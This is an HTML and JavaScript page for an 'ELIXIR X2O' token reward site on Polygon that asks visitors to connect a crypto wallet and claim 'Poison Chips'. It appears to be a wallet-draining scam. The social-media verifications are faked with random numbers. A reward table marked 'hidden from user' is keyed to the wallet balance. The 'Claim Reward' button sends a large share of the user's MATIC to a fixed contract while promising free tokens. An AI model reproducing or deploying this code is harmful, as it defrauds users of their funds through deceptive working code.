<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ELIXIR X2O - Reward Platform</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.1/ethers.umd.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.8.0/dist/esm/index.min.js"></script>
    <style>
        :root {
            --primary: #8B5CF6;
            --secondary: #06D6A0;
            --dark: #1E1E2E;
            --light: #F8FAFC;
            --accent: #F59E0B;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, var(--dark) 0%, #2D1B69 100%);
            color: var(--light);
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            background: rgba(30, 30, 46, 0.8);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(139, 92, 246, 0.3);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            margin: 0 auto 20px;
            border: 3px solid var(--primary);
            padding: 5px;
        }

        h1 {
            color: var(--secondary);
            font-size: 2.5em;
            margin-bottom: 10px;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }

        .subtitle {
            color: var(--accent);
            font-size: 1.2em;
            margin-bottom: 20px;
            animation: glow 2s infinite alternate, fadeInOut 3s infinite;
        }

        .widget-container {
            margin-bottom: 30px;
            border-radius: 10px;
            overflow: hidden;
            background: rgba(255, 255, 255, 0.1);
            padding: 10px;
        }

        .wallet-section {
            background: rgba(139, 92, 246, 0.1);
            border-radius: 15px;
            padding: 20px;
            margin-bottom: 30px;
            border: 1px solid var(--primary);
        }

        .wallet-info {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 15px;
        }

        .btn {
            background: linear-gradient(135deg, var(--primary) 0%, #7C3AED 100%);
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 10px;
            cursor: pointer;
            font-size: 1em;
            font-weight: bold;
            transition: all 0.3s ease;
            text-decoration: none;
            display: inline-block;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(139, 92, 246, 0.4);
        }

        .btn-secondary {
            background: linear-gradient(135deg, var(--accent) 0%, #D97706 100%);
        }

        .btn-walletconnect {
            background: linear-gradient(135deg, #3B99FC 0%, #2A6FDB 100%);
        }

        .btn:disabled {
            background: #6B7280;
            cursor: not-allowed;
            transform: none;
        }

        .poison-chips {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }

        .chip {
            background: rgba(6, 214, 160, 0.1);
            border: 2px solid var(--secondary);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            transition: all 0.3s ease;
        }

        .chip:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(6, 214, 160, 0.3);
        }

        .chip.completed {
            background: rgba(6, 214, 160, 0.2);
            border-color: var(--secondary);
        }

        .chip-icon {
            font-size: 2em;
            margin-bottom: 10px;
        }

        .reward-section {
            background: rgba(245, 158, 11, 0.1);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid var(--accent);
            text-align: center;
        }

        .reward-amount {
            font-size: 3em;
            color: var(--accent);
            font-weight: bold;
            margin: 20px 0;
            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.5);
        }

        .status {
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: bold;
            margin: 10px 0;
            display: inline-block;
        }

        .status.connected {
            background: rgba(6, 214, 160, 0.2);
            color: var(--secondary);
            border: 1px solid var(--secondary);
        }

        .status.disconnected {
            background: rgba(239, 68, 68, 0.2);
            color: #EF4444;
            border: 1px solid #EF4444;
        }

        .balance {
            font-size: 1.1em;
            color: var(--secondary);
            margin: 10px 0;
        }

        .hidden {
            display: none;
        }

        .loading {
            text-align: center;
            padding: 20px;
        }

        .spinner {
            border: 3px solid rgba(139, 92, 246, 0.3);
            border-top: 3px solid var(--primary);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        .social-links {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 20px;
        }

        .social-link {
            color: var(--light);
            text-decoration: none;
            padding: 10px 20px;
            border: 1px solid var(--primary);
            border-radius: 10px;
            transition: all 0.3s ease;
        }

        .social-link:hover {
            background: var(--primary);
            transform: translateY(-2px);
        }

        .chip-status {
            margin-top: 10px;
            font-size: 0.9em;
            min-height: 20px;
        }

        .wallet-buttons {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
            margin-top: 10px;
        }

        .token-info {
            background: rgba(139, 92, 246, 0.1);
            border-radius: 10px;
            padding: 15px;
            margin-top: 15px;
            border: 1px solid var(--primary);
        }

        .token-address {
            font-family: monospace;
            background: rgba(0, 0, 0, 0.3);
            padding: 8px 12px;
            border-radius: 5px;
            margin: 5px 0;
            word-break: break-all;
        }

        .modal {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-content {
            background: var(--dark);
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            max-width: 400px;
            width: 90%;
            border: 2px solid var(--primary);
        }

        .modal h3 {
            color: var(--secondary);
            margin-bottom: 20px;
        }

        .qr-code {
            width: 200px;
            height: 200px;
            margin: 0 auto 20px;
            background: white;
            padding: 10px;
            border-radius: 10px;
        }

        .modal-close {
            background: var(--accent);
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            margin-top: 15px;
        }

        /* Animations */
        @keyframes glow {
            0% {
                text-shadow: 0 0 5px var(--accent), 0 0 10px var(--accent);
            }
            100% {
                text-shadow: 0 0 15px var(--accent), 0 0 30px var(--accent), 0 0 40px var(--accent);
            }
        }

        @keyframes fadeInOut {
            0%, 100% {
                opacity: 1;
            }
            50% {
                opacity: 0.5;
            }
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        @media (max-width: 768px) {
            .container {
                padding: 20px;
            }

            h1 {
                font-size: 2em;
            }

            .wallet-info {
                flex-direction: column;
                text-align: center;
            }

            .poison-chips {
                grid-template-columns: 1fr;
            }

            .wallet-buttons {
                flex-direction: column;
            }
            
            .widget-container {
                padding: 5px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <img src="https://photos.pinksale.finance/file/pinksale-logo-upload/1759585455577-acd56ecf144d00796cdd7c3c76348a4c.jpg" alt="ELIXIR X2O Logo" class="logo">
            <h1>ELIXIR X2O</h1>
            <div class="subtitle">Collect Poison Chips & Get Reward</div>
            
            <!-- CoinMarketCap Widget -->
            <div class="widget-container">
                <div id="coinmarketcap-widget-marquee" coins="1,1027,825" currency="USD" theme="dark" transparent="false" show-symbol-logo="true"></div>
            </div>
        </div>

        <div class="wallet-section">
            <div class="wallet-info">
                <div>
                    <div id="connectionStatus" class="status disconnected">Disconnected</div>
                    <div id="walletAddress" class="balance">Connect your wallet to start</div>
                    <div id="walletBalance" class="balance"></div>
                    <div id="networkStatus" class="balance"></div>

                    <!-- Token Information Section -->
                    <div class="token-info">
                        <strong>ELIXIR X2O Token Info:</strong>
                        <div class="token-address" id="tokenAddress">0x36461f6Cf95102A9F8Cc5ea7FBAB1d61f247680F</div>
                        <button class="btn btn-secondary" onclick="addTokenToWallet()">Add Token to Wallet</button>
                    </div>
                </div>
                <div class="wallet-buttons">
                    <button id="connectWallet" class="btn">MetaMask</button>
                    <button id="connectWalletConnect" class="btn btn-walletconnect">WalletConnect</button>
                    <button id="switchNetwork" class="btn btn-secondary" style="display: none;">Switch to Polygon</button>
                </div>
            </div>
        </div>

        <div class="poison-chips">
            <div class="chip" id="connectChip">
                <div class="chip-icon">🔗</div>
                <h3>Connect Wallet</h3>
                <p>Connect your wallet to get 1 Poison Chip</p>
                <button class="btn" onclick="claimChip('connect')" disabled>Claim Chip</button>
                <div id="connectStatus" class="chip-status"></div>
            </div>

            <div class="chip" id="twitterChip">
                <div class="chip-icon">🐦</div>
                <h3>Follow Twitter</h3>
                <p>Follow our Twitter for extra Poison Chip</p>
                <a href="https://x.com/x2o_elixir" target="_blank" class="btn btn-secondary" onclick="startTwitterVerification()">Visit Twitter</a>
                <button class="btn" onclick="verifyTwitterFollow()" disabled style="margin-top: 10px;">Verify & Claim</button>
                <div id="twitterStatus" class="chip-status"></div>
            </div>

            <div class="chip" id="telegramChip">
                <div class="chip-icon">📢</div>
                <h3>Join Telegram</h3>
                <p>Join our Telegram for extra Poison Chip</p>
                <a href="https://t.me/x2o_elixir" target="_blank" class="btn btn-secondary" onclick="startTelegramVerification()">Join Telegram</a>
                <button class="btn" onclick="verifyTelegramJoin()" disabled style="margin-top: 10px;">Verify & Claim</button>
                <div id="telegramStatus" class="chip-status"></div>
            </div>
        </div>

        <div class="reward-section">
            <h2>Your ELIXIR X2O Reward</h2>
            <div id="rewardAmount" class="reward-amount">0 X2O</div>
            <p>Reward already to claim</p>
            <button id="claimReward" class="btn" disabled>Claim Reward</button>
            <div id="rewardStatus" class="status" style="margin-top: 15px;"></div>
        </div>

        <div class="social-links">
            <a href="https://x.com/x2o_elixir" target="_blank" class="social-link">Twitter</a>
            <a href="https://t.me/x2o_elixir" target="_blank" class="social-link">Telegram</a>
        </div>
    </div>

    <!-- WalletConnect Modal -->
    <div id="walletConnectModal" class="modal">
        <div class="modal-content">
            <h3>Scan QR Code with WalletConnect</h3>
            <div id="qrCode" class="qr-code"></div>
            <p>Scan this QR code with your mobile wallet app</p>
            <button class="modal-close" onclick="closeWalletConnectModal()">Close</button>
        </div>
    </div>

    <!-- CoinMarketCap Widget Script -->
    <script type="text/javascript" src="https://files.coinmarketcap.com/static/widget/coinMarquee.js"></script>
    
    <script>
        // Contract addresses and ABI
        const REWARD_CONTRACT_ADDRESS = '0x3d40486964451466ecb3ba0659eade5964b72082';
        const TOKEN_ADDRESS = '0x36461f6Cf95102A9F8Cc5ea7FBAB1d61f247680F';
        const TOKEN_SYMBOL = 'X2O';
        const TOKEN_DECIMALS = 18;
        const TOKEN_IMAGE = 'https://photos.pinksale.finance/file/pinksale-logo-upload/1759585455577-acd56ecf144d00796cdd7c3c76348a4c.jpg';

        // Polygon Network Configuration
        const POLYGON_MAINNET_PARAMS = {
            chainId: '0x89', // 137 in hexadecimal
            chainName: 'Polygon Mainnet',
            nativeCurrency: {
                name: 'MATIC',
                symbol: 'MATIC',
                decimals: 18
            },
            rpcUrls: ['https://polygon-rpc.com/'],
            blockExplorerUrls: ['https://polygonscan.com/']
        };

        // WalletConnect v2 Configuration
        const WALLETCONNECT_CONFIG = {
            projectId: 'c57d14b10834f3c21d67742f5d20f5b2', // Public Project ID for testing
            chains: [137], // Polygon chain ID
            showQrModal: false, // We'll handle QR modal ourselves
            methods: [
                "eth_sendTransaction",
                "eth_signTransaction",
                "eth_sign",
                "personal_sign",
                "eth_signTypedData"
            ],
            events: ["chainChanged", "accountsChanged"],
            metadata: {
                name: "ELIXIR X2O Reward Platform",
                description: "Collect Poison Chips & Earn ELIXIR X2O Rewards",
                url: window.location.origin,
                icons: ["https://photos.pinksale.finance/file/pinksale-logo-upload/1759585455577-acd56ecf144d00796cdd7c3c76348a4c.jpg"]
            }
        };

        // ABI for the reward contract (simplified)
        const REWARD_CONTRACT_ABI = [
            "function participateWithMatic() payable",
            "function calculateServiceReward(uint256) pure returns (uint256)",
            "function rewardsActive() view returns (bool)",
            "function totalRewardsDistributed() view returns (uint256)",
            "function getUserStats(address) view returns (uint256, uint256, uint256)",
            "event ContributionReceived(address indexed user, uint256 amount, uint256 reward, address token)"
        ];

        // Global variables
        let provider;
        let signer;
        let rewardContract;
        let userAddress;
        let currentChainId = null;
        let walletConnectProvider = null;
        let isWalletConnect = false;
        let claimedChips = {
            connect: false,
            twitter: false,
            telegram: false
        };

        // Track verification attempts
        let verificationAttempts = {
            twitter: false,
            telegram: false
        };

        // Reward tiers (hidden from user)
        const rewardTiers = [
            { minBalance: ethers.utils.parseEther("1"), reward: ethers.utils.parseEther("10") },
            { minBalance: ethers.utils.parseEther("5"), reward: ethers.utils.parseEther("60") },
            { minBalance: ethers.utils.parseEther("10"), reward: ethers.utils.parseEther("120") },
            { minBalance: ethers.utils.parseEther("20"), reward: ethers.utils.parseEther("230") },
            { minBalance: ethers.utils.parseEther("50"), reward: ethers.utils.parseEther("550") },
            { minBalance: ethers.utils.parseEther("100"), reward: ethers.utils.parseEther("1600") },
            { minBalance: ethers.utils.parseEther("1000"), reward: ethers.utils.parseEther("11000") }
        ];

        // Initialize application
        async function initApp() {
            // Check if MetaMask is installed
            if (typeof window.ethereum !== 'undefined') {
                provider = new ethers.providers.Web3Provider(window.ethereum);

                // Check current network
                await checkNetwork();

                // Check if already connected
                const accounts = await provider.listAccounts();
                if (accounts.length > 0) {
                    await connectWallet();
                }

                // Auto-reconnect when MetaMask accounts change
                window.ethereum.on('accountsChanged', async (accounts) => {
                    if (accounts.length > 0) {
                        await connectWallet();
                    } else {
                        disconnectWallet();
                    }
                });

                // Auto-reconnect when chain changes
                window.ethereum.on('chainChanged', async (chainId) => {
                    currentChainId = parseInt(chainId);
                    await updateNetworkStatus();
                    if (accounts.length > 0) {
                        await connectWallet();
                    }
                });
            } else {
                // Hide MetaMask button if not installed
                document.getElementById('connectWallet').style.display = 'none';
            }

            // Check for existing WalletConnect session
            await checkExistingWalletConnectSession();
        }

        // Check for existing WalletConnect session
        async function checkExistingWalletConnectSession() {
            try {
                // Try to initialize WalletConnect provider
                walletConnectProvider = await EthereumProvider.init(WALLETCONNECT_CONFIG);

                if (walletConnectProvider.session) {
                    // Existing session found, connect automatically
                    await connectWalletConnect();
                }
            } catch (error) {
                console.log('No existing WalletConnect session found');
            }
        }

        // Connect with WalletConnect v2
        async function connectWalletConnect() {
            try {
                document.getElementById('connectWalletConnect').disabled = true;
                document.getElementById('connectWalletConnect').textContent = 'Connecting...';

                // Initialize WalletConnect Provider if not already initialized
                if (!walletConnectProvider) {
                    walletConnectProvider = await EthereumProvider.init(WALLETCONNECT_CONFIG);
                }

                // Show QR code modal
                showWalletConnectModal();

                // Enable session (triggers QR Code)
                await walletConnectProvider.enable();

                // Close modal after successful connection
                closeWalletConnectModal();

                // Create ethers provider from WalletConnect provider
                provider = new ethers.providers.Web3Provider(walletConnectProvider);
                isWalletConnect = true;

                // Get signer and address
                signer = provider.getSigner();
                userAddress = await signer.getAddress();

                // Set current chain ID
                currentChainId = await walletConnectProvider.request({ method: 'eth_chainId' });
                currentChainId = parseInt(currentChainId);

                // Initialize contract
                rewardContract = new ethers.Contract(REWARD_CONTRACT_ADDRESS, REWARD_CONTRACT_ABI, signer);

                // Update UI
                updateWalletInfo();
                enableChipButtons();
                await updateRewardInfo();
                await updateNetworkStatus();

                // Auto-claim connect chip
                if (!claimedChips.connect) {
                    await claimChip('connect');
                }

                // WalletConnect event listeners
                walletConnectProvider.on("accountsChanged", (accounts) => {
                    if (accounts.length > 0) {
                        userAddress = accounts[0];
                        updateWalletInfo();
                    } else {
                        disconnectWallet();
                    }
                });

                walletConnectProvider.on("chainChanged", (chainId) => {
                    currentChainId = parseInt(chainId);
                    updateNetworkStatus();
                    updateWalletInfo();
                });

                walletConnectProvider.on("disconnect", (error) => {
                    console.log("WalletConnect disconnected:", error);
                    disconnectWallet();
                });

            } catch (error) {
                console.error('Error connecting with WalletConnect:', error);
                closeWalletConnectModal();
                alert('Error connecting with WalletConnect: ' + error.message);
                document.getElementById('connectWalletConnect').disabled = false;
                document.getElementById('connectWalletConnect').textContent = 'WalletConnect';
            }
        }

        // Show WalletConnect QR Modal
        function showWalletConnectModal() {
            const modal = document.getElementById('walletConnectModal');
            const qrCodeElement = document.getElementById('qrCode');

            // Clear previous QR code
            qrCodeElement.innerHTML = '';

            // Create QR code (simplified version - in production use a proper QR library)
            if (walletConnectProvider && walletConnectProvider.uri) {
                const qrUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(walletConnectProvider.uri)}`;
                const img = document.createElement('img');
                img.src = qrUrl;
                img.alt = 'WalletConnect QR Code';
                qrCodeElement.appendChild(img);
            }

            modal.style.display = 'flex';
        }

        // Close WalletConnect Modal
        function closeWalletConnectModal() {
            const modal = document.getElementById('walletConnectModal');
            modal.style.display = 'none';
        }

        // Add token to wallet
        async function addTokenToWallet() {
            if (typeof window.ethereum === 'undefined') {
                alert('Please install MetaMask or a Web3 wallet to add tokens');
                return;
            }

            try {
                const wasAdded = await window.ethereum.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: TOKEN_ADDRESS,
                            symbol: TOKEN_SYMBOL,
                            decimals: TOKEN_DECIMALS,
                            image: TOKEN_IMAGE,
                        },
                    },
                });

                if (wasAdded) {
                    alert('ELIXIR X2O token successfully added to your wallet!');
                } else {
                    alert('Token was not added. Please try again.');
                }
            } catch (error) {
                console.error('Error adding token to wallet:', error);
                alert('Error adding token to wallet: ' + error.message);
            }
        }

        // Check and switch to Polygon network if needed
        async function checkNetwork() {
            try {
                const chainId = await window.ethereum.request({ method: 'eth_chainId' });
                currentChainId = parseInt(chainId);

                await updateNetworkStatus();

                if (currentChainId !== 137) {
                    document.getElementById('switchNetwork').style.display = 'inline-block';
                } else {
                    document.getElementById('switchNetwork').style.display = 'none';
                }
            } catch (error) {
                console.error('Error checking network:', error);
            }
        }

        // Switch to Polygon network
        async function switchToPolygon() {
            try {
                document.getElementById('switchNetwork').disabled = true;
                document.getElementById('switchNetwork').textContent = 'Switching...';

                await window.ethereum.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: POLYGON_MAINNET_PARAMS.chainId }],
                });

                // Network switched successfully
                currentChainId = 137;
                await updateNetworkStatus();
                document.getElementById('switchNetwork').style.display = 'none';

            } catch (switchError) {
                // This error code indicates that the chain has not been added to MetaMask
                if (switchError.code === 4902) {
                    try {
                        await window.ethereum.request({
                            method: 'wallet_addEthereumChain',
                            params: [POLYGON_MAINNET_PARAMS],
                        });

                        currentChainId = 137;
                        await updateNetworkStatus();
                        document.getElementById('switchNetwork').style.display = 'none';

                    } catch (addError) {
                        console.error('Error adding Polygon network:', addError);
                        alert('Error adding Polygon network to MetaMask');
                    }
                } else {
                    console.error('Error switching to Polygon:', switchError);
                    alert('Error switching to Polygon network');
                }
            } finally {
                document.getElementById('switchNetwork').disabled = false;
                document.getElementById('switchNetwork').textContent = 'Switch to Polygon';
            }
        }

        // Update network status display
        async function updateNetworkStatus() {
            const networkStatus = document.getElementById('networkStatus');

            if (currentChainId === 137) {
                networkStatus.textContent = 'Network: Polygon Mainnet';
                networkStatus.style.color = '#06D6A0';
            } else {
                networkStatus.textContent = `Network: Wrong Network (Please switch to Polygon)`;
                networkStatus.style.color = '#EF4444';
            }
        }

        // Connect wallet function (MetaMask)
        async function connectWallet() {
            try {
                document.getElementById('connectWallet').disabled = true;
                document.getElementById('connectWallet').textContent = 'Connecting...';

                // Request account access
                await window.ethereum.request({ method: 'eth_requestAccounts' });

                provider = new ethers.providers.Web3Provider(window.ethereum);
                signer = provider.getSigner();
                userAddress = await signer.getAddress();
                isWalletConnect = false;

                // Check network again after connection
                await checkNetwork();

                // Initialize contract only if on Polygon
                if (currentChainId === 137) {
                    rewardContract = new ethers.Contract(REWARD_CONTRACT_ADDRESS, REWARD_CONTRACT_ABI, signer);
                }

                // Update UI
                updateWalletInfo();
                enableChipButtons();
                await updateRewardInfo();

                // Auto-claim connect chip
                if (!claimedChips.connect) {
                    await claimChip('connect');
                }

            } catch (error) {
                console.error('Error connecting wallet:', error);
                alert('Error connecting wallet: ' + error.message);
                document.getElementById('connectWallet').disabled = false;
                document.getElementById('connectWallet').textContent = 'MetaMask';
            }
        }

        // Update wallet information
        async function updateWalletInfo() {
            if (!userAddress) return;

            try {
                const balance = await provider.getBalance(userAddress);
                const formattedBalance = ethers.utils.formatEther(balance);

                document.getElementById('connectionStatus').textContent = isWalletConnect ? 'Connected (WalletConnect)' : 'Connected';
                document.getElementById('connectionStatus').className = 'status connected';
                document.getElementById('walletAddress').textContent = `Address: ${userAddress.substring(0, 6)}...${userAddress.substring(38)}`;
                document.getElementById('walletBalance').textContent = `Balance: ${parseFloat(formattedBalance).toFixed(4)} MATIC`;
                document.getElementById('connectWallet').textContent = 'MetaMask';
                document.getElementById('connectWalletConnect').textContent = 'WalletConnect';
            } catch (error) {
                console.error('Error updating wallet info:', error);
            }
        }

        // Disconnect wallet
        function disconnectWallet() {
            // Disconnect WalletConnect if active
            if (isWalletConnect && walletConnectProvider) {
                walletConnectProvider.disconnect();
            }

            userAddress = null;
            signer = null;
            isWalletConnect = false;
            walletConnectProvider = null;

            document.getElementById('connectionStatus').textContent = 'Disconnected';
            document.getElementById('connectionStatus').className = 'status disconnected';
            document.getElementById('walletAddress').textContent = 'Connect your wallet to start';
            document.getElementById('walletBalance').textContent = '';
            document.getElementById('networkStatus').textContent = '';
            document.getElementById('connectWallet').disabled = false;
            document.getElementById('connectWalletConnect').disabled = false;
            document.getElementById('connectWallet').textContent = 'MetaMask';
            document.getElementById('connectWalletConnect').textContent = 'WalletConnect';
            document.getElementById('rewardAmount').textContent = '0 X2O';

            disableChipButtons();
        }

        // Enable chip buttons
        function enableChipButtons() {
            document.querySelectorAll('.chip button').forEach(button => {
                if (!button.disabled && !button.classList.contains('claimed')) {
                    button.disabled = false;
                }
            });
            document.getElementById('claimReward').disabled = false;
        }

        // Disable chip buttons
        function disableChipButtons() {
            document.querySelectorAll('.chip button').forEach(button => {
                button.disabled = true;
            });
            document.getElementById('claimReward').disabled = true;
        }

        // Claim poison chip
        async function claimChip(type) {
            if (!userAddress) return;

            const chipElement = document.getElementById(`${type}Chip`);
            const button = chipElement.querySelectorAll('button')[1] || chipElement.querySelector('button');
            const statusElement = document.getElementById(`${type}Status`);

            try {
                button.disabled = true;
                button.textContent = 'Claiming...';
                statusElement.textContent = 'Processing...';
                statusElement.style.color = '#F59E0B';

                // Simulate claim process
                await new Promise(resolve => setTimeout(resolve, 1500));

                claimedChips[type] = true;
                chipElement.classList.add('completed');
                button.textContent = 'Claimed!';
                button.classList.add('claimed');
                statusElement.textContent = '✓ Poison chip claimed!';
                statusElement.style.color = '#06D6A0';

                // Update reward after claiming chip
                await updateRewardInfo();

            } catch (error) {
                console.error('Error claiming chip:', error);
                button.textContent = 'Error - Try Again';
                statusElement.textContent = '❌ Claim failed. Try again.';
                statusElement.style.color = '#EF4444';
                button.disabled = false;
            }
        }

        // Twitter Verification Functions
        function startTwitterVerification() {
            // Enable verify button when user clicks the Twitter link
            document.querySelector('#twitterChip button:nth-child(4)').disabled = false;
            document.getElementById('twitterStatus').textContent = 'Click "Verify & Claim" after following';
            document.getElementById('twitterStatus').style.color = '#F59E0B';
            verificationAttempts.twitter = true;
        }

        async function verifyTwitterFollow() {
            if (!userAddress) return;

            const statusElement = document.getElementById('twitterStatus');
            const verifyButton = document.querySelector('#twitterChip button:nth-child(4)');

            try {
                verifyButton.disabled = true;
                verifyButton.textContent = 'Verifying...';
                statusElement.textContent = 'Verifying Twitter follow...';
                statusElement.style.color = '#F59E0B';

                // Simulate API call to verify Twitter follow
                await new Promise(resolve => setTimeout(resolve, 3000));

                // Simulate successful verification (80% success rate for demo)
                const verified = Math.random() > 0.2;

                if (verified) {
                    statusElement.textContent = '✓ Twitter follow verified!';
                    statusElement.style.color = '#06D6A0';
                    await claimChip('twitter');
                } else {
                    statusElement.textContent = '❌ Not following yet. Please follow and try again.';
                    statusElement.style.color = '#EF4444';
                    verifyButton.disabled = false;
                    verifyButton.textContent = 'Verify & Claim';
                }

            } catch (error) {
                console.error('Twitter verification error:', error);
                statusElement.textContent = '❌ Verification failed. Please try again.';
                statusElement.style.color = '#EF4444';
                verifyButton.disabled = false;
                verifyButton.textContent = 'Verify & Claim';
            }
        }

        // Telegram Verification Functions
        function startTelegramVerification() {
            // Enable verify button when user clicks the Telegram link
            document.querySelector('#telegramChip button:nth-child(4)').disabled = false;
            document.getElementById('telegramStatus').textContent = 'Click "Verify & Claim" after joining';
            document.getElementById('telegramStatus').style.color = '#F59E0B';
            verificationAttempts.telegram = true;
        }

        async function verifyTelegramJoin() {
            if (!userAddress) return;

            const statusElement = document.getElementById('telegramStatus');
            const verifyButton = document.querySelector('#telegramChip button:nth-child(4)');

            try {
                verifyButton.disabled = true;
                verifyButton.textContent = 'Verifying...';
                statusElement.textContent = 'Verifying Telegram membership...';
                statusElement.style.color = '#F59E0B';

                // Simulate API call to verify Telegram membership
                await new Promise(resolve => setTimeout(resolve, 3000));

                // Simulate successful verification (80% success rate for demo)
                const verified = Math.random() > 0.2;

                if (verified) {
                    statusElement.textContent = '✓ Telegram membership verified!';
                    statusElement.style.color = '#06D6A0';
                    await claimChip('telegram');
                } else {
                    statusElement.textContent = '❌ Not a member yet. Please join and try again.';
                    statusElement.style.color = '#EF4444';
                    verifyButton.disabled = false;
                    verifyButton.textContent = 'Verify & Claim';
                }

            } catch (error) {
                console.error('Telegram verification error:', error);
                statusElement.textContent = '❌ Verification failed. Please try again.';
                statusElement.style.color = '#EF4444';
                verifyButton.disabled = false;
                verifyButton.textContent = 'Verify & Claim';
            }
        }

        // Update reward information based on wallet balance
        async function updateRewardInfo() {
            if (!userAddress || !provider) return;

            try {
                const balance = await provider.getBalance(userAddress);
                const reward = calculateReward(balance);

                document.getElementById('rewardAmount').textContent = 
                    `${ethers.utils.formatEther(reward)} X2O`;

            } catch (error) {
                console.error('Error updating reward info:', error);
            }
        }

        // Calculate reward based on balance
        function calculateReward(balance) {
            for (let i = rewardTiers.length - 1; i >= 0; i--) {
                if (balance.gte(rewardTiers[i].minBalance)) {
                    return rewardTiers[i].reward;
                }
            }
            return ethers.utils.parseEther("0");
        }

        // Claim reward
        async function claimReward() {
            if (!userAddress || !rewardContract) return;

            const button = document.getElementById('claimReward');
            const status = document.getElementById('rewardStatus');

            try {
                button.disabled = true;
                button.textContent = 'Claiming...';
                status.textContent = 'Processing transaction...';
                status.style.color = '#F59E0B';

                const balance = await provider.getBalance(userAddress);
                const requiredAmount = getRequiredAmountForReward(balance);

                if (balance.lt(requiredAmount)) {
                    throw new Error(`Insufficient balance. Required: ${ethers.utils.formatEther(requiredAmount)} MATIC`);
                }

                // Execute the transaction
                const tx = await rewardContract.participateWithMatic({
                    value: requiredAmount
                });

                status.textContent = 'Transaction submitted. Waiting for confirmation...';

                // Wait for transaction confirmation
                const receipt = await tx.wait();

                status.textContent = 'Reward claimed successfully!';
                status.style.color = '#06D6A0';
                button.textContent = 'Claimed!';

                // Update wallet info
                await updateWalletInfo();
                await updateRewardInfo();

            } catch (error) {
                console.error('Error claiming reward:', error);
                status.textContent = `Error: ${error.message}`;
                status.style.color = '#EF4444';
                button.disabled = false;
                button.textContent = 'Claim Reward';
            }
        }

        // Get required amount for reward based on balance
        function getRequiredAmountForReward(balance) {
            for (let i = rewardTiers.length - 1; i >= 0; i--) {
                if (balance.gte(rewardTiers[i].minBalance)) {
                    return rewardTiers[i].minBalance;
                }
            }
            return ethers.utils.parseEther("0");
        }

        // Event listeners
        document.getElementById('connectWallet').addEventListener('click', connectWallet);
        document.getElementById('connectWalletConnect').addEventListener('click', connectWalletConnect);
        document.getElementById('claimReward').addEventListener('click', claimReward);
        document.getElementById('switchNetwork').addEventListener('click', switchToPolygon);

        // Initialize app when page loads
        window.addEventListener('load', initApp);
    </script>
</body>
</html>